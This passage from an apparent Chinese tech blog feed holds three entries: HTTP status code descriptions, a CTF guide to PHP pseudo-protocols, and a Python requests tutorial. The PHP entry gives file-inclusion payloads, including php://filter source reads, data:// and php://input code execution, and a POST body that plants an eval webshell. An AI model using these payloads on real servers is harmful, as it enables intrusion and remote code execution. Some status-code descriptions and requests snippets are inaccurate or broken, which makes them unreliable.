<code>Content-Length</code>头之后，客户端可以再次提交该请求。</li><li><code>412</code>:服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。</li><li><code>413</code>:服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。</li><li><code>414</code>:请求的<code>URI</code> 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。</li><li><code>415</code>:对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</li><li><code>416</code>:如果请求中包含了<code>Range</code>请求头，并且<code>Range</code>中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 <code>If-Range</code> 请求头，那么服务器就应当返回<code>416状态码</code>。</li><li><code>417</code>: 在请求头 <code>Expect</code>中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</li><li><code>421</code>: 从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。</li><li><code>423</code>: 请求格式正确，但是由于含有语义错误，无法响应。</li><li><code>424</code>: 由于之前的某个请求发生的错误，导致当前请求失败，例如 <code>PROPPATCH</code>。</li><li><code>425</code>: 在<code>WebDav Advanced Collections</code> 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。</li><li><code>426</code>: 客户端应当切换到TLS/1.0。</li><li><code>449</code>: 由微软扩展，代表请求应当在执行完适当的操作后进行重试。</li></ul></li><li>状态码详情(5**)<ul><li><code>500</code>: 服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。</li><li><code>501</code>: 服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</li><li><code>502</code>: 作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</li><li><code>503</code>: 由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</li><li><code>504</code>: 作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。</li><li><code>505</code>: 服务器不支持，或者拒绝支持在请求中使用的HTTP版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</li><li><code>506</code>: 由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</li><li><code>507</code>: 服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。<code>WebDAV (RFC 4918)</code></li><li><code>509</code>: 服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</li><li><code>510</code>: 获取资源所需要的策略并没有没满足。<code>（RFC 2774）</code></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;http状态码&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常见状态码&lt;ul&gt;
&lt;li&gt;200  请求成功&lt;/li&gt;
&lt;li&gt;301 资源网页被永久转移到其他URL&lt;/li&gt;
&lt;li&gt;404 请求的资源网页 不存在&lt;/li&gt;
&lt;li&gt;500 内部服务器错误&lt;</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="http" scheme="https://sinevil.github.io/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="https://sinevil.github.io/2021/08/13/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>https://sinevil.github.io/2021/08/13/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-08-13T01:13:58.000Z</published>
    <updated>2021-08-13T02:51:32.846Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php伪协议</strong></p><ul><li>PHP带有很多内置UR L风格的封装协议，可用于fopen，copy，file_exists,filesize等文件系统函数，除了这些内置的封装协议，还能通过stream_wrapper_register注册自定义的封装协议，这些协议被称为伪协议</li><li>常见的php伪协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file://<span class="comment">#访问本地文件系统</span></span><br><span class="line">http:// <span class="comment">#访问 HTTP(s) 网址</span></span><br><span class="line">ftp:// <span class="comment">#访问 FTP(s) URLs</span></span><br><span class="line">php:// <span class="comment">#访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:// <span class="comment">#压缩流</span></span><br><span class="line">data:// <span class="comment">#数据（RFC 2397）</span></span><br><span class="line">glob:// <span class="comment">#查找匹配的文件路径模式</span></span><br><span class="line">phar://<span class="comment">#PHP 归档</span></span><br><span class="line">ssh2://<span class="comment">#Secure Shell 2</span></span><br><span class="line">rar:// <span class="comment">#RAR</span></span><br><span class="line">ogg:// <span class="comment">#音频流</span></span><br><span class="line">expect:// <span class="comment">#处理交互式的流</span></span><br></pre></td></tr></table></figure><p><strong>file://协议</strong></p><ul><li>条件：<ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code>:off/on</li></ul></li><li>作用：</li></ul><p>用于访问本地文件系统</p><ul><li>说明<a href="%5Bhttp://php.net/manual/zh/wrappers.file.php%5D(https://link.segmentfault.com/?url=http://php.net/manual/zh/wrappers.file.php)">详情</a>：</li></ul><p><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p><ul><li>用法：</li></ul><ol><li>file://文件的绝对路径和文件名</li></ol><p><a href="http://127.0.0.1/cmd.php?file=%60file://D:/soft/phpStudy/WWW/phpcode.txt%60">http://127.0.0.1/cmd.php?file=`file://D:/soft/phpStudy/WWW/phpcode.txt`</a></p><ol start="2"><li>file文件相对路径和文件名</li></ol><p><a href="http://127.0.0.1/include.php?%60file=./phpinfo.txt%60">http://127.0.0.1/include.php?`file=./phpinfo.txt`</a></p><ol start="3"><li>http://网络路径和文件名</li></ol><p><a href="http://127.0.0.1/include.php?%60file=http://127.0.0.1/phpinfo.txt%60">http://127.0.0.1/include.php?`file=http://127.0.0.1/phpinfo.txt`</a></p><p><strong>php://协议</strong></p><ul><li><p>条件：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :on（仅<code>php://input php://stdin php://memory php://temp </code>需要on）</li></ul></li><li><p>作用：</p></li></ul><p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码</p><ul><li>说明<a href="https://www.php.net/manual/zh/wrappers.php.php">详情</a>：</li></ul><p> PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器</p><table><thead><tr><th align="center">协议</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">php://input</td><td align="center">可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的</td></tr><tr><td align="center">php://output</td><td align="center">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区</td></tr><tr><td align="center">php://fd</td><td align="center">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3</td></tr><tr><td align="center">php://memory php://temp</td><td align="center">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致</td></tr><tr><td align="center">php://filter</td><td align="center">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器</td></tr></tbody></table><ul><li>php://filter参数详解</li></ul><p> 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定</p><table><thead><tr><th align="center">php://fileter参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">resource=&lt;要过滤的数据流&gt;</td><td align="center">这个参数是必须的。它指定了你要筛选过滤的数据流</td></tr><tr><td align="center">read=&lt;读链的过滤器&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔</td></tr><tr><td align="center">write=&lt;写链的过滤器&gt;</td><td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔</td></tr><tr><td align="center">&lt;; 两个链的过滤器&gt;</td><td align="center">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li>可用过滤器列表<a href="%5Bhttps://www.php.net/manual/zh/filters.php%5D(https://link.segmentfault.com/?url=https://www.php.net/manual/zh/filters.php)">详情</a></li></ul><table><thead><tr><th align="center">字符串过滤器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">string.rot13</td><td align="center">等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td align="center">string.toupper</td><td align="center">等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td align="center">string.tolower</td><td align="center">等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td align="center">string.strip_tags</td><td align="center">等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th align="center">转换过滤器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">convert.base64-encode &amp; convert.base64-decode</td><td align="center">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td align="center">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td align="center">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th align="center">压缩过滤器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">zlib.deflate &amp; zlib.inflate</td><td align="center">在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分</td></tr><tr><td align="center">bzip2.compress &amp; bzip2.decompress</td><td align="center">同上，在本地文件系统中创建 bz2 兼容文件的方法</td></tr></tbody></table><table><thead><tr><th align="center">加密过滤器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">mcrypt.*</td><td align="center">libmcrypt 对称加密算法</td></tr><tr><td align="center">mdecrypt.*</td><td align="center">libmcrypt 对称解密算法</td></tr></tbody></table><ul><li>用法：</li></ul><ol><li><p>php://filter/read=convert.base64-encode/resource=[文件名]</p><p>读取文件源码（针对php文件需要base64编码）</p></li></ol><p><a href="http://127.0.0.1/include.php?file=%60php://filter/read=convert.base64-encode/resource=phpinfo.php%60">http://127.0.0.1/include.php?file=`php://filter/read=convert.base64-encode/resource=phpinfo.php`</a></p><ol start="2"><li><p>php://input + [POST DATA]</p><p>执行php代码</p></li></ol><p><a href="http://127.0.0.1/include.php?file=%60php://input%5BPOST">http://127.0.0.1/include.php?file=`php://input[POST</a> DATA部分]<code> </code><?php phpinfo(); ?><code>    </code><?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>‘); ?&gt;`</p><p><strong>zip:// &amp; bzip2:// &amp; zlib://协议</strong></p><ul><li>条件：<ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li>作用：</li></ul><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</p><ul><li><p>说明<a href="%5Bhttp://php.net/manual/zh/wrappers.compression.php%5D(https://link.segmentfault.com/?url=http://php.net/manual/zh/wrappers.compression.php)">详情</a>：</p></li><li><p>用法：</p></li></ul><ol><li><p>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p></li></ol><p><a href="http://127.0.0.1/include.php?file=%60zip://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.jpg%23phpinfo.txt%60">http://127.0.0.1/include.php?file=`zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt`</a></p><ol start="2"><li><p>compress.bzip2://file.bz2</p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p></li></ol><p><a href="http://127.0.0.1/include.php?file=%60compress.bzip2://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.bz2%60">http://127.0.0.1/include.php?file=`compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2`</a></p><ol start="3"><li><p>compress.zlib://file.g`</p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p></li></ol><p><a href="http://127.0.0.1/include.php?file=%60compress.zlib://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.gz%60">http://127.0.0.1/include.php?file=`compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz`</a></p><p><strong>data://协议</strong></p><ul><li>条件：<ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li>作用：</li></ul><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP</p><ul><li>用法：</li></ul><ol><li>data://text/plain,</li></ol><p><a href="http://127.0.0.1/include.php?file=%60data://text/plain">http://127.0.0.1/include.php?file=`data://text/plain</a>,<?php%20phpinfo();?>`</p><ol start="2"><li>data://text/plain;base64,</li></ol><p><a href="http://127.0.0.1/include.php?file=%60data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+%60">http://127.0.0.1/include.php?file=`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`</a></p><p><strong>http:// &amp; https://协议</strong></p><ul><li>条件：<ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li>作用：</li></ul><p>常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含</p><ul><li>用法：</li></ul><p><a href="http://127.0.0.1/include.php?file=%60http://127.0.0.1/phpinfo.txt%60">http://127.0.0.1/include.php?file=`http://127.0.0.1/phpinfo.txt`</a></p><p><strong>phar协议</strong></p><ul><li>类似于zip;//协议</li><li>用法：</li></ul><p><a href="http://127.0.0.1/include.php?file=%60phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt%60">http://127.0.0.1/include.php?file=`phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt`</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php伪协议&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP带有很多内置UR L风格的封装协议，可用于fopen，copy，file_exists,filesize等文件系统函数，除了这些内置的封装协议，还能通过stream_wrapper_regist</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Python的requests模块（持续）</title>
    <link href="https://sinevil.github.io/2021/08/12/requests/"/>
    <id>https://sinevil.github.io/2021/08/12/requests/</id>
    <published>2021-08-12T08:28:05.000Z</published>
    <updated>2021-08-13T02:48:55.817Z</updated>
    
    <content type="html"><![CDATA[<p><strong>python的requests模块</strong></p><p><strong>requset模块</strong></p><p>requests模块是python中常用的写网页爬虫程序的包，requests可以发送HTTP请求，并获取请求状态及请求内容，也可以用来做接口自动化测试</p><p><strong>功能</strong></p><ul><li>获取网站信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response))<span class="comment">#返回值的类型</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)<span class="comment">#当前网站返回的状态码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text))<span class="comment">#网页内容的类型</span></span><br><span class="line"><span class="built_in">print</span>(response.text)<span class="comment">#网页的具体内容（html代码）</span></span><br><span class="line"><span class="built_in">print</span>(response.cookies)<span class="comment">#网页的cookie</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)<span class="comment">#网站的请求头</span></span><br><span class="line"><span class="built_in">print</span>(response.history)<span class="comment">#网站的历史记录</span></span><br></pre></td></tr></table></figure><ul><li>各种请求方式</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>) </span><br><span class="line">requests.post(<span class="string">&#x27;http://www.baidu.com/post&#x27;</span>)</span><br><span class="line">requests.delete(<span class="string">&#x27;http://www.baidu.com/delete&#x27;</span>)</span><br><span class="line">requests.put(<span class="string">&#x27;http://www.baidu.com/put&#x27;</span>)</span><br><span class="line">requests.head(<span class="string">&#x27;http://www.baidu.com/get&#x27;</span>)</span><br><span class="line">requests.options(<span class="string">&#x27;http://www.baidu.com/get&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>GET请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#增加参数</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get?name=germey&amp;age=22&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>,params=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析json</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text))</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br><span class="line"><span class="built_in">print</span>(json.loads(response.text))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.json()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取二进制数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://github.com/favicon.ico&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.text),<span class="built_in">type</span>(response.content))</span><br><span class="line"><span class="built_in">print</span>(response.text)i</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取照片</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;https://github.com/favicon.ico&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;facicon.ico&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.content)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加headers，爬虫</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><ul><li>POST请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基本的POST请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">response = requests.post(url,data,headers)</span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br><span class="line"></span><br><span class="line"><span class="comment">#response属性</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.jianshu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.status_code), response.status_code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.headers), response.headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.cookies), response.cookies)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.url), response.url)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.history), response.history)</span><br><span class="line"></span><br><span class="line"><span class="comment">#状态码的判断</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.jianshu.com&#x27;</span>)</span><br><span class="line">exit()<span class="keyword">if</span> <span class="keyword">not</span> response.status_code ==requests.codes.ok <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&#x27;成功访问&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>其他操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件上传</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;文件名称&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&quot;网址&quot;</span>,file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取cookie</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.cookies)</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> response.cookies.items():</span><br><span class="line">    <span class="built_in">print</span>(key+<span class="string">&quot;=&quot;</span>+value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#session维持</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.get(<span class="string">&#x27;http://httpbin.org/cookies/set/number/123456789&#x27;</span>)</span><br><span class="line">response = s.get(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#证书检测（待续）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;https://www.12306.cn&#x27;</span>,verify = <span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理设置（待续）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxys = (&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>,proxys)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#超时设置（Timeout参数设置超时时间）</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ReadTimeout</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;http://www.baidu.com&#x27;</span>,timeout =<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span 